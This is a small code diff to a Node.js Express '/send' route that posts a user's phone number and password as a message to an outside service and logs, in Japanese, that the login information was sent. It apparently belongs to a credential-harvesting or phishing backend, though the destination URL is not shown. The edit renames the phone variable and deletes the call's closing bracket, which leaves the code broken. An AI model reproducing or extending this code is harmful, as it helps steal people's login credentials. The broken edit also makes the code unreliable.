@@ -27,10 +27,10 @@ app.post("/send", async (req, res) => {
       headers: {
         "Content-Type": "application/json"
       },
-      body: JSON.stringify({
-        content: `\ntel: ${phone}\npass: ${password}`
+            body: JSON.stringify({
+        content: `\ntel: ${cleanPhone}\npass: ${password}`
       })
-    });
+
 
     console.log("ログイン情報 送信成功");
 
